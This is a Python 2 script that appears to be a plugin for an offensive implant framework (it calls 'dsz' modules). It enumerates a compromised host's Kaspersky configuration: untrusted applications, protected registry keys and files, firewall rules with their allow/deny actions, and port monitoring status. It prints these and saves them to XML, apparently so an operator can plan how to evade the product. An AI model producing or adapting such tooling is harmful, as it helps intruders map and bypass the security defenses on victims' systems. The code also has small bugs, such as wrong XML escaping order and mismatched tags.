
import dsz, dsz.lp, dsz.env, dsz.file, os, shutil, subprocess, re, StringIO, datetime, binascii

def safePrint(strInput):
    print strInput.encode('utf8')

def myProc():
    strCmd = 'processinfo'
    dsz.control.echo.Off()
    dsz.cmd.Run(strCmd, dsz.RUN_FLAG_RECORD)
    modVal = dsz.cmd.data.Get('processinfo::modules::module::modulename', dsz.TYPE_STRING)
    iAm = modVal[0].split('\\')
    return iAm[(len(iAm) - 1)]

def basicRegquery(strCmd):
    if dsz.cmd.Run(strCmd, dsz.RUN_FLAG_RECORD):
        returnVal = dsz.cmd.data.Get('key::value::value', dsz.TYPE_STRING)
        return returnVal[0]
    else:
        safePrint((('!!! ' + strCmd) + ' FAILED!!!'))
        return 'E'

def hex2asciiString(hexStr):
    outString = ''
    loopCounter = 0
    while (loopCounter < len(hexStr)):
        outString = (outString + hex2ascii(hexStr[loopCounter:(loopCounter + 2)]))
        loopCounter += 2
    return outString

def padOutput(length, inStr):
    while (len(inStr) < length):
        inStr = (inStr + ' ')
    return inStr

def lateKasAppRules(line, kasXmlFilePtr):
    trustedAppLines = re.findall('4b4c417070.*?3a5c.*?0089301', line)
    appTrustLevel = ''
    appFullPath = ''
    appGroup = ''
    outputLine = ''
    printFlag = False
    safePrint('+----------------------------------------------------------------------------------+')
    safePrint('|  UNTRUSTED APPLICATIONS (THINGS THE PSP HAS FLAGGED AS BAD):                     |')
    safePrint('+----------------------------------------------------------------------------------+')
    kasXmlFilePtr.write('<application_trust_levels>\n')
    for a in trustedAppLines:
        appGroup = re.match('.*008930(.*?)008930020089300200.*', a)
        trimmedAppLine = re.match('.*(4b4c417070.*?3a5c.*?008930).*', a)
        appTrustLevel = re.match('.*(4b4c417070.*?)0000.*', a)
        if (appTrustLevel != None):
            if (re.match('.*Untrusted.*', hex2asciiString(appTrustLevel.group(1))) or re.match('.*Low.*', hex2asciiString(appTrustLevel.group(1)))):
                printFlag = True
            kasXmlFilePtr.write((('<application>\n<trust_level>' + xmlScrub(hex2asciiString(appTrustLevel.group(1)))) + '</trust_level>\n'))
            outputLine = ('|\t\t' + hex2asciiString(appTrustLevel.group(1)))
        appFullPath = re.match('.*([0-9a-fA-F]{2}3a5c.*?)008930.*', a)
        if (appFullPath != None):
            outputLine = ((outputLine + ':\t') + hex2asciiString(appFullPath.group(1)))
            kasXmlFilePtr.write((('<path>' + xmlScrub(hex2asciiString(appFullPath.group(1)))) + '</path>\n</application>\n'))
            if printFlag:
                safePrint(outputLine)
                printFlag = False
    kasXmlFilePtr.write('</application_trust_levels>\n')
    return True

def compRegQuery(regCmd, descStr, kasXmlFilePtr):
    ruleStatus = 'UNKNOWN'
    logStatus = 'UNKNOWN'
    ruleStatus = 'UNKNOWN'
    logStatus = 'UNKNOWN'
    actionVal = 'UNKNOWN'
    if dsz.cmd.Run(regCmd, dsz.RUN_FLAG_RECORD):
        regName = dsz.cmd.data.Get('key::value::name', dsz.TYPE_STRING)
        regValue = dsz.cmd.data.Get('key::value::value', dsz.TYPE_STRING)
        actionVal = ''
        for i in range(len(regName)):
            if re.match('.*LOG.*', regName[i].upper()):
                if (regValue[i] == '1'):
                    logStatus = 'ENABLED'
                if (regValue[i] == '0'):
                    logStatus = 'DISABLED'
            if re.match('.*ENABLED.*', regName[i].upper()):
                if (regValue[i] == '1'):
                    ruleStatus = 'ENABLED'
                if (regValue[i] == '0'):
                    ruleStatus = 'DISABLED'
            if re.match('.*ACTION.*', regName[i].upper()):
                actionVal = regValue[i]
        if (actionVal == '0'):
            actionVal = 'ALLOW'
        elif (actionVal == '1'):
            actionVal = 'PROMPT FOR ACTION'
        elif (actionVal == '2'):
            actionVal = '?????'
        elif (actionVal == '4'):
            actionVal = 'QUARANTINE'
        else:
            actionVal = 'UNKNOWN'
    safePrint((((((((('| ' + padOutput(40, descStr)) + ' | ') + padOutput(10, ruleStatus)) + ' | ') + padOutput(10, logStatus)) + ' | ') + padOutput(10, actionVal)) + '|'))
    kasXmlFilePtr.write('\t<setting>\n')
    kasXmlFilePtr.write((('\t\t<name>' + descStr) + '<name>\n'))
    kasXmlFilePtr.write((('\t\t<logging>' + logStatus) + '</loging>\n'))
    kasXmlFilePtr.write((('\t\t<status>' + ruleStatus) + '</status>\n'))
    kasXmlFilePtr.write((('\t\t<action>' + actionVal) + '</action>\n'))
    kasXmlFilePtr.write('\t</setting>\n')
    if (ruleStatus == 'DISABLED'):
        return False
    return True

def lateKasRegRules(line, kasXmlFilePtr):
    safePrint('+----------------------------------------------------------------------------------+')
    safePrint('|  REGISTRY AND FILE PROTECTION FOUND                                              |')
    safePrint('|    SERVICES REGISTRY KEYS PROTECTED BY KASPERSKY:                                |')
    safePrint('|    (SEE XML FILE FOR PROTECTED NON-SERVICES REGISTRY KEYS)                       |')
    safePrint('+----------------------------------------------------------------------------------+')
    inRegGuard = 0
    keyName = ''
    keyLoc = ''
    outputString = ''
    inApplicationList = 0
    registryGuardLines = line.split('8930')
    columnWidth = 45
    columnPad = ''
    keyType = ''
    while (len(columnPad) < columnWidth):
        columnPad = (columnPad + ' ')
    kasXmlFilePtr.write('<reg_file_protection>\n')
    for y in range(len(registryGuardLines)):
        if (y != 0):
            if re.match('.*4b4c50726f746563746564206170706c69636174696f6e73.*', registryGuardLines[y]):
                inApplicationList = 1
            if (1 == inApplicationList):
                keyName = re.match('.*([0-9a-fA-F]{2}3a5c.*?)0000.*', registryGuardLines[y])
                if (None != keyName):
                    kasXmlFilePtr.write((('<protected_file>' + xmlScrub(hex2asciiString(keyName.group(1)))) + '</protected_file>\n'))
            else:
                keyName = re.match('[0-9a-fA-F]{2}(.*)00018bfcb48.*', registryGuardLines[y])
                if (keyName != None):
                    outputString = ((outputString + hex2asciiString(keyName.group(1))) + ', ')
                elif ('042a00' != y):
                    keyLoc = re.match('[0-9a-fA-F]{2}(.*?)0000', registryGuardLines[y])
                    if (keyLoc != None):
                        if (outputString == ''):
                            if re.match('KL.*', hex2asciiString(keyLoc.group(1))):
                                keyType = hex2asciiString(keyLoc.group(1))
                        else:
                            outputString = outputString[0:(len(outputString) - 2)]
                            splitKeys = outputString.split(', ')
                            kasXmlFilePtr.write('<key_block>\n')
                            kasXmlFilePtr.write((('<key_type>' + keyType) + '</key_type>\n'))
                            for t in splitKeys:
                                kasXmlFilePtr.write((('<key>' + xmlScrub(t)) + '</key>\n'))
                            kasXmlFilePtr.write((('<key_location>' + xmlScrub(hex2asciiString(keyLoc.group(1)))) + '</key_location>\n'))
                            kasXmlFilePtr.write('</key_block>\n')
                            while (len(outputString) < columnWidth):
                                outputString = (outputString + ' ')
                            if (len(outputString) == columnWidth):
                                if re.match('.*Services.*', keyType):
                                    safePrint(('|\t%s |    %s' % (outputString, hex2asciiString(keyLoc.group(1)))))
                            elif re.match('.*Services.*', keyType):
                                safePrint(('|\t%s' % outputString))
                                safePrint((('|' + columnPad) + ('  |    %s' % hex2asciiString(keyLoc.group(1)))))
                            outputString = ''
                    elif (hex2asciiString(registryGuardLines[y]) != '*'):
                        outputString = ((outputString + hex2asciiString(registryGuardLines[y])) + ', ')
    kasXmlFilePtr.write('</reg_file_protection>\n')
    return True

def lateKasFw(fwRules, kasXmlFilePtr, fwActionBlock):
    splitRules = fwRules.split('07268930')
    hexName = ''
    printSection = ''
    entryAddress = fwRules[0:4]
    descLen = 0
    fwDesc = ''
    fwDescStr = ''
    k = 0
    for i in splitRules:
        if (i == 0):
            entryAddress = i
        else:
            descLen = len(i)
            if (entryAddress != i):
                fwDescStr = ((((fwDescStr + 'XX') + entryAddress) + '07268930') + i[0:(descLen - 8)])
                entryAddress = i[(descLen - 4):descLen]
    fwDescList = fwDescStr.split('XX')
    entryAddress = ''
    safePrint('+----------------------------------------------------------------------------------+')
    safePrint('|  FIREWALL RULES FOR UNTRUSTED NETWORKS:')
    kasXmlFilePtr.write('<firewall_rules>\n')
    for j in range(len(fwDescList)):
        printSection = ''
        if (fwDescList[j] != ''):
            printSection = (printSection + '+----------------------------------------------------------------------------------+\n')
            splitLine = fwDescList[j].partition('00018bfcb4c0')
            tempName = splitLine[0]
            hexName = tempName[14:len(tempName)]
            entryAddress = tempName[0:4]
            asciiName = ''
            asciiTemp = ''
            connType = ''
            connProto = ''
            portDelimiter = ''
            portListing = ''
            portString = ''
            numRemPorts = 0
            numLocPorts = 0
            hexPortOne = ''
            hexPortTwo = ''
            for k in range(0, len(hexName), 2):
                asciiTemp = hex2ascii(hexName[k:(k + 2)])
                asciiName += asciiTemp
            asciiName = binascii.unhexlify(hexName)
            kasXmlFilePtr.write((((('<rule>\n<rule_name>' + xmlScrub(asciiName)) + '</rule_name>\n<entry_address>') + xmlScrub(entryAddress)) + '</entry_address>\n'))
            printSection = (printSection + ('|    RULE NAME:    %s\n' % asciiName))
            secHalf = splitLine[2]
            portDelimiter = (secHalf[24:26] + '0000')
            if ('00' == secHalf[20:22]):
                portDelimiter = (secHalf[26:28] + '0000')
                if ('00' == secHalf[22:24]):
                    portDelimiter = ''
            if (secHalf[10:12] == '00'):
                printSection = (printSection + ('|      PROTOCOL/DIRECTION:    UNDEFINED(%s)\n' % secHalf[10:12]))
                kasXmlFilePtr.write('<protocol>UNDEFINED</protocol>\n')
            elif ((secHalf[10:12] == '06') or (secHalf[10:12] == '11')):
                if (secHalf[10:12] == '06'):
                    connProto = 'TCP'
                elif (secHalf[10:12] == '11'):
                    connProto = 'UDP'
                if ('05' == secHalf[12:14]):
                    connType = 'Outbound (Stream)'
                elif ('04' == secHalf[12:14]):
                    connType = 'Inbound (Stream)'
                elif ('01' == secHalf[12:14]):
                    connType = 'Echo Reply'
                elif ('03' == secHalf[12:14]):
                    connType = 'Inbound/Outbound'
                elif ('02' == secHalf[12:14]):
                    connType = 'Outbound'
                else:
                    connType = 'UNKNOWN'
                printSection = (printSection + ('|      PROTOCOL/DIRECTION:    %s    %s:(%s|%s)\n' % (connProto, connType, secHalf[10:12], secHalf[12:14])))
                kasXmlFilePtr.write((('<protocol>' + xmlScrub(connProto)) + '</protocol>\n'))
                kasXmlFilePtr.write((('<connection_type>' + xmlScrub(connType)) + '</connection_type>\n'))
            elif ((secHalf[10:12] == '01') or (secHalf[10:12] == '3a')):
                if (secHalf[10:12] == '01'):
                    connProto = 'ICMP'
                else:
                    connProto = 'ICMPv6'
                if (secHalf[18:20] == '01'):
                    printSection = (printSection + ('|      PROTOCOL:    %s(%s)    TYPE:NONE     CODE:NONE\n' % (connProto, secHalf[6:12])))
                    kasXmlFilePtr.write((('<protocol>' + xmlScrub(connProto)) + '</protocol>\n<type>NONE</type><code>NONE</code>'))
                elif (secHalf[18:20] == '05'):
                    printSection = (printSection + ('|      PROTOCOL:    %s(%s)    TYPE:0x%s    CODE:NONE\n' % (connProto, secHalf[6:12], secHalf[14:16])))
                    kasXmlFilePtr.write((((('<protocol>' + xmlScrub(connProto)) + '</protocol>\n<type>') + xmlScrub(secHalf[6:12])) + '</type><code>NONE</code>'))
                elif (secHalf[18:20] == '07'):
                    printSection = (printSection + ('|      PROTOCOL:    %s(%s)     TYPE:0x%s\tCODE:0x\n%s' % (connProto, secHalf[6:12], secHalf[14:16], secHalf[16:18])))
                    kasXmlFilePtr.write((((((('<protocol>' + xmlScrub(connProto)) + '</protocol>\n<type>') + xmlScrub(secHalf[6:12])) + '</type><code>') + xmlScrub(secHalf[16:18])) + '</code>'))
                else:
                    printSection = (printSection + ('|      !!UNKNOWN TYPE/ICMP CODE CONFIGURATION    (%s)!!!    PROTOCOL:    %s = ICMP    TYPE:0x%s    CODE:0x%s\n' % (secHalf[18:20], secHalf[6:12], secHalf[13:15], secHalf[16:18])))
            else:
                printSection = (printSection + ('|       PROTOCOL:    %s = UNKNOWN\n' % secHalf[10:12]))
                kasXmlFilePtr.write('<protocol>UNKNOWN</protocol>\n')
            connType = secHalf[12:14]
            numRemPorts = hex2int(secHalf[20:22])
            if (0 == numRemPorts):
                numLocPorts = hex2int(secHalf[22:24])
            if ((numLocPorts + numRemPorts) != 0):
                portString = (secHalf[20:len(secHalf)] + '000000')
                tempPortString = ''
                skipFirstString = 1
                hexPortOne = ''
                hexPortTwo = ''
                loopCounter = 0
                portType = ''
                portCounter = 0
                remotePorts = ''
                localPorts = ''
                while (loopCounter < (len(portString) - 4)):
                    if (portCounter < numRemPorts):
                        portType = 'REMOTE'
                    else:
                        portType = 'LOCAL'
                    if (portString[loopCounter:(loopCounter + 4)] != '0000'):
                        tempPortString = (tempPortString + portString[loopCounter:(loopCounter + 2)])
                    elif (1 == skipFirstString):
                        skipFirstString = 0
                        tempPortString = ''
                        loopCounter += 2
                    elif (len(tempPortString) > 8):
                        hexPortOne = (tempPortString[2:4] + tempPortString[0:2])
                        hexPortTwo = (tempPortString[6:8] + tempPortString[4:6])
                        if (hexPortOne == hexPortTwo):
                            if (portType == 'LOCAL'):
                                localPorts = (localPorts + ('%d, ' % hex2int(hexPortOne)))
                                kasXmlFilePtr.write(('<local_port>\n<range_start>%d</range_start>\n<range_stop>%d</range_stop>\n</local_port>\n' % (hex2int(hexPortOne), hex2int(hexPortOne))))
                            else:
                                remotePorts = (remotePorts + ('%d, ' % hex2int(hexPortOne)))
                                kasXmlFilePtr.write(('<remote_port>\n<range_start>%d</range_start>\n<range_stop>%d</range_stop>\n</remote_port>\n' % (hex2int(hexPortOne), hex2int(hexPortOne))))
                        elif (portType == 'REMOTE'):
                            remotePorts = (localPorts + ('%d-%d, ' % (hex2int(hexPortOne), hex2int(hexPortTwo))))
                            kasXmlFilePtr.write(('<remote_port>\n<range_start>%d</range_start>\n<range_stop>%d</range_stop>\n</remote_port>\n' % (hex2int(hexPortOne), hex2int(hexPortTwo))))
                        else:
                            kasXmlFilePtr.write(('<local_port>\n<range_start>%d</range_start>\n<range_stop>%d</range_stop>\n</local_port>\n' % (hex2int(hexPortOne), hex2int(hexPortTwo))))
                        tempPortString = ''
                        loopCounter += 2
                        portCounter += 1
                    else:
                        tempPortString = (tempPortString + portString[loopCounter:(loopCounter + 2)])
                    loopCounter += 2
                if (remotePorts != ''):
                    printSection = (printSection + ('|      REMOTE PORTS:    %s\n' % remotePorts[0:(len(remotePorts) - 2)]))
                    remotePorts = ''
                if (localPorts != ''):
                    printSection = (printSection + ('|      LOCAL PORTS:     %s\n' % localPorts[0:(len(localPorts) - 2)]))
                    localPorts = ''
            descLen = len(secHalf)
            asciiName = ''
            n = re.match(('.*(%s[0-9a-fA-F]{4}).*' % entryAddress), fwActionBlock)
            if n:
                actionRule = n.group(1)
                actionRuleMeaning = ''
                if ('2' == actionRule[7:8]):
                    actionRuleMeaning = 'ACCORDING TO APPLICATION RULE'
                elif ('3' == actionRule[7:8]):
                    actionRuleMeaning = 'DENY/NO LOGGING'
                elif ('0' == actionRule[7:8]):
                    actionRuleMeaning = 'ALLOW/NO LOGGING'
                elif ('4' == actionRule[7:8]):
                    actionRuleMeaning = 'ALLOW/LOG'
                elif ('7' == actionRule[7:8]):
                    actionRuleMeaning = 'DENY/LOG'
                else:
                    actionRuleMeaning = '!!!UNKNOWN!!!'
                printSection = (printSection + ('|      ACTION RULE:    %s (%s)' % (actionRuleMeaning, actionRule[6:8])))
                safePrint(printSection)
                printSection = ''
                kasXmlFilePtr.write((('<action_rule>' + xmlScrub(actionRuleMeaning)) + '</action_rule>'))
            if ((j + 1) < len(fwDescList)):
                entryAddress = secHalf[(descLen - 6):descLen]
            kasXmlFilePtr.write('</rule>\n')
    kasXmlFilePtr.write('</firewall_rules>\n')
    return True

def lateKasPortMon(line, kasXmlFilePtr):
    splitPortMonitor = line.split('8930')
    portsMon = '|        '
    portsNotMon = '|        '
    safePrint('+----------------------------------------------------------------------------------+')
    safePrint('| PORT MONITORING STATUS (DISABLED PORTS HAVE PRIORITY):                            |')
    safePrint('+----------------------------------------------------------------------------------+')
    hexPort = ''
    hexCode = ''
    notPortCount = 1
    portCount = 1
    portMonitoring = 'UNKNOWN'
    for p in splitPortMonitor:
        if (len(portsMon) > (portCount * 70)):
            portsMon = (portsMon + '\n|        ')
            portCount += 1
        if (len(portsNotMon) > (notPortCount * 70)):
            portsNotMon = (portsNotMon + '\n|        ')
            notPortCount += 1
        hexPort = (p[(len(p) - 2):len(p)] + p[(len(p) - 4):(len(p) - 2)])
        if ((p[(len(p) - 5):(len(p) - 4)] == '0') and (p[(len(p) - 8):(len(p) - 5)] == '000')):
            portsNotMon = (portsNotMon + ('%d, ' % hex2int(hexPort)))
        if ((p[(len(p) - 8):(len(p) - 5)] == '000') and (p[(len(p) - 8):(len(p) - 5)] == '000')):
            portsMon = (portsMon + ('%d, ' % hex2int(hexPort)))
    safePrint('|    PORT MONITORING ENABLED ON (UNLESS LISTED AS DISABLED):')
    safePrint(portsMon)
    safePrint('|    PORT MONITORING DISABLED ON:')
    safePrint(portsNotMon)
    return True

def errorBail(inStr):
    safePrint('************************************************************************')
    safePrint('*                     !!!!WARNING!!!!                   ')
    safePrint('*   A FATAL ERROR HAS OCCURED AND THE KASPERSKY SCRIPT IS BAILING!!!!')
    safePrint('************************************************************************')
    safePrint('*    DETAILS:')
    safePrint(('*    ' + inStr))
    safePrint('************************************************************************')
    return True

def xmlScrub(inStr):
    outStr = ''
    outStr = inStr.replace('"', '&quot;')
    outStr = outStr.replace("'", '&apos;')
    outStr = outStr.replace('&', '&amp;')
    outStr = outStr.replace('<', '&lt;')
    outStr = outStr.replace('>', '&gt;')
    return outStr

def hex2int(hexStr):
    hexStr = hexStr.upper()
    strLen = len(hexStr)
    intMultiplier = 0
    intBase = 1
    intNumber = 0
    for i in range(strLen):
        i += 1
        if ('0' == hexStr[(strLen - i)]):
            intMultiplier = 0
        if ('1' == hexStr[(strLen - i)]):
            intMultiplier = 1
        if ('2' == hexStr[(strLen - i)]):
            intMultiplier = 2
        if ('3' == hexStr[(strLen - i)]):
            intMultiplier = 3
        if ('4' == hexStr[(strLen - i)]):
            intMultiplier = 4
        if ('5' == hexStr[(strLen - i)]):
            intMultiplier = 5
        if ('6' == hexStr[(strLen - i)]):
            intMultiplier = 6
        if ('7' == hexStr[(strLen - i)]):
            intMultiplier = 7
        if ('8' == hexStr[(strLen - i)]):
            intMultiplier = 8
        if ('9' == hexStr[(strLen - i)]):
            intMultiplier = 9
        if ('A' == hexStr[(strLen - i)]):
            intMultiplier = 10
        if ('B' == hexStr[(strLen - i)]):
            intMultiplier = 11
        if ('C' == hexStr[(strLen - i)]):
            intMultiplier = 12
        if ('D' == hexStr[(strLen - i)]):
            intMultiplier = 13
        if ('E' == hexStr[(strLen - i)]):
            intMultiplier = 14
        if ('F' == hexStr[(strLen - i)]):
            intMultiplier = 15
        intNumber += (intMultiplier * intBase)
        intBase *= 16
    return intNumber

def hex2ascii(hexStr):
    if (hexStr == '20'):
        return ' '
    elif (hexStr == '21'):
        return '!'
    elif (hexStr == '22'):
        return '"'
    elif (hexStr == '23'):
        return '#'
    elif (hexStr == '24'):
        return '$'
    elif (hexStr == '25'):
        return '%'
    elif (hexStr == '26'):
        return '&'
    elif (hexStr == '27'):
        return "'"
    elif (hexStr == '28'):
        return '('
    elif (hexStr == '29'):
        return ')'
    elif (hexStr == '2a'):
        return '*'
    elif (hexStr == '2b'):
        return '+'
    elif (hexStr == '2c'):
        return ','
    elif (hexStr == '2d'):
        return '-'
    elif (hexStr == '2e'):
        return '.'
    elif (hexStr == '2f'):
        return '/'
    elif (hexStr == '30'):
        return '0'
    elif (hexStr == '31'):
        return '1'
    elif (hexStr == '32'):
        return '2'
    elif (hexStr == '33'):
        return '3'
    elif (hexStr == '34'):
        return '4'
    elif (hexStr == '35'):
        return '5'
    elif (hexStr == '36'):
        return '6'
    elif (hexStr == '37'):
        return '7'
    elif (hexStr == '38'):
        return '8'
    elif (hexStr == '39'):
        return '9'
    elif (hexStr == '3a'):
        return ':'
    elif (hexStr == '3b'):
        return ';'
    elif (hexStr == '3c'):
        return '<'
    elif (hexStr == '3d'):
        return '='
    elif (hexStr == '3e'):
        return '>'
    elif (hexStr == '3f'):
        return '?'
    elif (hexStr == '40'):
        return '@'
    elif (hexStr == '41'):
        return 'A'
    elif (hexStr == '42'):
        return 'B'
    elif (hexStr == '43'):
        return 'C'
    elif (hexStr == '44'):
        return 'D'
    elif (hexStr == '45'):
        return 'E'
    elif (hexStr == '46'):
        return 'F'
    elif (hexStr == '47'):
        return 'G'
    elif (hexStr == '48'):
        return 'H'
    elif (hexStr == '49'):
        return 'I'
    elif (hexStr == '4a'):
        return 'J'
    elif (hexStr == '4b'):
        return 'K'
    elif (hexStr == '4c'):
        return 'L'
    elif (hexStr == '4d'):
        return 'M'
    elif (hexStr == '4e'):
        return 'N'
    elif (hexStr == '4f'):
        return 'O'
    elif (hexStr == '50'):
        return 'P'
    elif (hexStr == '51'):
        return 'Q'
    elif (hexStr == '52'):
        return 'R'
    elif (hexStr == '53'):
        return 'S'
    elif (hexStr == '54'):
        return 'T'
    elif (hexStr == '55'):
        return 'U'
    elif (hexStr == '56'):
        return 'V'
    elif (hexStr == '57'):
        return 'W'
    elif (hexStr == '58'):
        return 'X'
    elif (hexStr == '59'):
        return 'Y'
    elif (hexStr == '5a'):
        return 'Z'
    elif (hexStr == '5b'):
        return '['
    elif (hexStr == '5c'):
        return '\\'
    elif (hexStr == '5d'):
        return ']'
    elif (hexStr == '5e'):
        return '^'
    elif (hexStr == '5f'):
        return '_'
    elif (hexStr == '60'):
        return '`'
    elif (hexStr == '61'):
        return 'a'
    elif (hexStr == '62'):
        return 'b'
    elif (hexStr == '63'):
        return 'c'
    elif (hexStr == '64'):
        return 'd'
    elif (hexStr == '65'):
        return 'e'
    elif (hexStr == '66'):
        return 'f'
    elif (hexStr == '67'):
        return 'g'
    elif (hexStr == '68'):
        return 'h'
    elif (hexStr == '69'):
        return 'i'
    elif (hexStr == '6a'):
        return 'j'
    elif (hexStr == '6b'):
        return 'k'
    elif (hexStr == '6c'):
        return 'l'
    elif (hexStr == '6d'):
        return 'm'
    elif (hexStr == '6e'):
        return 'n'
    elif (hexStr == '6f'):
        return 'o'
    elif (hexStr == '70'):
        return 'p'
    elif (hexStr == '71'):
        return 'q'
    elif (hexStr == '72'):
        return 'r'
    elif (hexStr == '73'):
        return 's'
    elif (hexStr == '74'):
        return 't'
    elif (hexStr == '75'):
        return 'u'
    elif (hexStr == '76'):
        return 'v'
    elif (hexStr == '77'):
        return 'w'
    elif (hexStr == '78'):
        return 'x'
    elif (hexStr == '79'):
        return 'y'
    elif (hexStr == '7a'):
        return 'z'
    else:
        return ''